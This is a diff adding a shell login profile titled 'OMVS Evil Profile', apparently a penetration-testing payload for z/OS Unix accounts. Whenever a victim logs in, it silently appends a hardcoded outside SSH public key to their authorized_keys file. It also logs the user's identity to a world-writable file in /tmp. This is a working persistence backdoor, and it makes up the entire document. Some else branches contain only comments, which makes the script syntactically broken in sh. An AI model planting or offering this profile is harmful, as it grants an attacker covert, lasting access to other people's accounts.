@@ -1,0 +1,33 @@
+# OMVS Evil Profile
+
+# Create an SSH directory
+MY_DIR="$HOME/.ssh"
+PUBLIC_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJMvAMqh4hfx+2oejVw2P2s19DNLK2FZgMN1w/x2+fOo dbryan@US-KFVK2R9HWR"
+TMP_FILE=/tmp/netspi-$USER-$(date +%m-%d-%y)
+
+if [ ! -d "$MY_DIR" ]; then
+    #echo "Creating directory: $MY_DIR"
+    mkdir -p "$MY_DIR"
+    # Optional: set specific permissions
+    chmod 700 "$MY_DIR"
+else
+    #echo "Directory already exists: $MY_DIR"
+fi
+
+# Add my public key to the authorized keys file.
+
+if [ ! -f "$MY_DIR/authorized_keys" ]; then
+    #echo "Creating file: $MY_DIR/authorized_keys"
+    touch "$MY_DIR/authorized_keys"
+    # Optional: set specific permissions
+    chmod 600 "$MY_DIR/authorized_keys"
+    echo $PUBLIC_KEY > $MY_DIR/authorized_keys
+else
+    #echo "File already exists: $MY_DIR/authorized_keys"
+    if [ $(grep "$PUBLIC_KEY" $MY_DIR/authorized_keys | wc -l) -eq 0 ] ; then
+      echo $PUBLIC_KEY >> $MY_DIR/authorized_keys
+    fi
+fi
+
+echo $USER:$(id) >> $TMP_FILE
+chmod 777 $TMP_FILE
